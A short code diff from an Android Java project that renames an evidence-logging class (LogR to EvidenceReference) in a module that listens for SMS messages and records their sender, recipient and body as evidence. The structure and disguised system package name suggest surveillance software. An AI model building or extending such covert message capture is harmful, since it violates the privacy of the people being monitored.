@@ -20,7 +20,7 @@ import com.android.networking.conf.ChildConf;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.conf.ConfigurationException;
 import com.android.networking.evidence.EvidenceType;
-import com.android.networking.evidence.LogR;
+import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.evidence.Markup;
 import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerSms;
@@ -385,7 +385,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		databuffer.write(ByteArray.padByteArray(from.getBytes(), 16));
 		databuffer.write(ByteArray.padByteArray(to.getBytes(), 16));
 
-		LogR.atomic(EvidenceType.SMS_NEW, additionalData, body);
+		EvidenceReference.atomic(EvidenceType.SMS_NEW, additionalData, body);
 	}
 
 	public int notification(Sms s) {
